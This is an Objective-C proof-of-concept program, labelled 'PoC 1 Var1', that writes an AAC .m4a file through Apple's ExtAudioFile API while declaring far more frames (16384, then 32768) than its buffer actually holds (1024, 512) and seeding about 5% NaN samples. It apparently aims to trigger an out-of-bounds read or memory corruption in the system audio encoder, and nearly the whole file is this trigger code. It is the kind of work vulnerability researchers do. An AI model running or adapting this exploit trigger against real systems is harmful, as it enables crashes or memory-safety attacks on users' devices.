#import <AVFoundation/AVFoundation.h>
#import <AudioToolbox/AudioToolbox.h>
#import <Foundation/Foundation.h>

int main(int argc, const char * argv[]) {
    @autoreleasepool {
        // Log start time
        time_t startTime = time(NULL);
        fprintf(stderr, "Starting encodeme at %s", ctime(&startTime));

        // Sample rates and format
        NSArray<NSNumber *> *sampleRates = @[@16000, @44100, @48000, @96000];
        AudioFormatID formatID = kAudioFormatMPEG4AAC; // Focus on AAC for PoC 1
        UInt32 channelNum = 2; // Stereo for simplicity
        double sampleRate = 44100.0; // Fixed for this variation to focus on sample count manipulation

        fprintf(stderr, "Processing sample rate %.0f, format %u, channels %u\n", sampleRate, (unsigned int)formatID, (unsigned int)channelNum);

        // Create AVAudioFormat
        AVAudioFormat *formatIn = [[AVAudioFormat alloc] initStandardFormatWithSampleRate:sampleRate channels:channelNum];
        if (!formatIn) {
            fprintf(stderr, "Failed to create AVAudioFormat for rate %.0f, channels %u\n", sampleRate, (unsigned int)channelNum);
            return 1;
        }

        // Set up output AudioStreamBasicDescription
        AudioStreamBasicDescription outputDescription = {0};
        outputDescription.mSampleRate = sampleRate;
        outputDescription.mFormatID = formatID;
        outputDescription.mChannelsPerFrame = channelNum;
        outputDescription.mFramesPerPacket = 1024; // Typical for AAC

        // Set up channel layout (stereo)
        AudioChannelLayoutTag layoutTag = kAudioChannelLayoutTag_Stereo;
        AVAudioChannelLayout *channelLayout = [[AVAudioChannelLayout alloc] initWithLayoutTag:layoutTag];
        if (!channelLayout || !channelLayout.layout) {
            fprintf(stderr, "Failed to create channel layout for rate %.0f, tag %u\n", sampleRate, (unsigned int)layoutTag);
            return 1;
        }

        // Create output file
        NSString *fileName = [NSString stringWithFormat:@"output_poc1_var1_%.0f_ch%u.m4a", sampleRate, (unsigned int)channelNum];
        NSURL *outUrl = [NSURL fileURLWithPath:fileName];
        fprintf(stderr, "Creating file: %s\n", fileName.UTF8String);

        ExtAudioFileRef audioFile = NULL;
        AudioChannelLayout *layoutCopy = (AudioChannelLayout *)calloc(1, sizeof(AudioChannelLayout));
        if (!layoutCopy) {
            fprintf(stderr, "Memory allocation failed for channel layout\n");
            return 1;
        }
        memcpy(layoutCopy, channelLayout.layout, sizeof(AudioChannelLayout));

        OSStatus status = ExtAudioFileCreateWithURL((__bridge CFURLRef)outUrl,
                                                    kAudioFileM4AType,
                                                    &outputDescription,
                                                    layoutCopy,
                                                    kAudioFileFlags_EraseFile,
                                                    &audioFile);
        free(layoutCopy);
        if (status != noErr) {
            fprintf(stderr, "Error creating file: %d (0x%x)\n", (int)status, (unsigned int)status);
            return 1;
        }

        // Set client data format (PCM float)
        AudioStreamBasicDescription clientFormat = *formatIn.streamDescription;
        status = ExtAudioFileSetProperty(audioFile, kExtAudioFileProperty_ClientDataFormat,
                                         sizeof(AudioStreamBasicDescription), &clientFormat);
        if (status != noErr) {
            fprintf(stderr, "Error setting client data format: %d\n", (int)status);
            ExtAudioFileDispose(audioFile);
            return 1;
        }

        // Set client channel layout
        status = ExtAudioFileSetProperty(audioFile, kExtAudioFileProperty_ClientChannelLayout,
                                         sizeof(AudioChannelLayout), channelLayout.layout);
        if (status != noErr) {
            fprintf(stderr, "Error setting client channel layout: %d\n", (int)status);
            ExtAudioFileDispose(audioFile);
            return 1;
        }

        // Allocate audio buffer
        const UInt32 pcmFramesInBuffer = 16384; // Large enough for declared frames
        float *audioBuffer = (float *)malloc(pcmFramesInBuffer * channelNum * sizeof(float));
        if (!audioBuffer) {
            fprintf(stderr, "Failed to allocate audio buffer\n");
            ExtAudioFileDispose(audioFile);
            return 1;
        }

        // Fill buffer with random PCM data
        for (size_t i = 0; i < pcmFramesInBuffer * channelNum; ++i) {
            audioBuffer[i] = ((float)arc4random() / UINT32_MAX) * 2.0f - 1.0f; // -1.0 to 1.0
            if (arc4random() % 100 < 5) audioBuffer[i] = NAN; // 5% chance of invalid samples
        }
        fprintf(stderr, "Filled audio buffer with %u PCM frames\n", (unsigned int)pcmFramesInBuffer);

        // PoC 1: First write - Inflated sample count
        UInt32 actualPCMFramesInData = 1024;
        UInt32 declaredPCMFramesForMetadata = 16384;
        AudioBufferList pocAudioBufferList = {0};
        pocAudioBufferList.mNumberBuffers = 1;
        pocAudioBufferList.mBuffers[0].mNumberChannels = channelNum;
        pocAudioBufferList.mBuffers[0].mDataByteSize = actualPCMFramesInData * channelNum * sizeof(float);
        pocAudioBufferList.mBuffers[0].mData = audioBuffer;

        fprintf(stderr, "PoC1 Var1: Writing %u declared frames, %u actual frames\n",
                (unsigned int)declaredPCMFramesForMetadata, (unsigned int)actualPCMFramesInData);
        status = ExtAudioFileWrite(audioFile, declaredPCMFramesForMetadata, &pocAudioBufferList);
        if (status != noErr) {
            fprintf(stderr, "Error writing audio (first write): %d\n", (int)status);
        }

        // PoC 1: Second write - Larger discrepancy
        actualPCMFramesInData = 512;
        declaredPCMFramesForMetadata = 32768;
        pocAudioBufferList.mBuffers[0].mDataByteSize = actualPCMFramesInData * channelNum * sizeof(float);
        fprintf(stderr, "PoC1 Var1: Writing %u declared frames, %u actual frames\n",
                (unsigned int)declaredPCMFramesForMetadata, (unsigned int)actualPCMFramesInData);
        status = ExtAudioFileWrite(audioFile, declaredPCMFramesForMetadata, &pocAudioBufferList);
        if (status != noErr) {
            fprintf(stderr, "Error writing audio (second write): %d\n", (int)status);
        }

        // Clean up
        status = ExtAudioFileDispose(audioFile);
        if (status != noErr) {
            fprintf(stderr, "Error disposing file: %d\n", (int)status);
        }
        free(audioBuffer);

        time_t endTime = time(NULL);
        fprintf(stderr, "encodeme completed at %s", ctime(&endTime));
    }
    return 0;
}
